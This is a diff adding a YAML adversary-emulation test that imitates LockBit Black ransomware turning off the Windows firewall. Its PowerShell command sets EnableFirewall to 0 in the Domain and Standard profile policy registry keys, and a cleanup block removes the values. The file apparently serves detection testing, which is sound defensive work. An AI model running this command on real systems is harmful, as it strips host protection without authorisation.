@@ -1,0 +1,16 @@
+- id: de59ed1f-cd16-5aee-ab87-858623687eb6
+  name: Soumaia ART Tests - LockBit Black - Unusual Windows firewall registry modification -Powershell
+  description: An adversary tries to modify the windows firewall registry. (requires elevation)
+  tactic: defense-impairment
+  technique:
+    attack_id: T1686
+    name: Disable or Modify System Firewall
+  platforms:
+    windows:
+      psh:
+        command: |-
+          New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
+          New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
+        cleanup: |-
+          Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"  -Name EnableFirewall -Force -ErrorAction Ignore
+          Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" -Name EnableFirewall -Force -ErrorAction Ignore
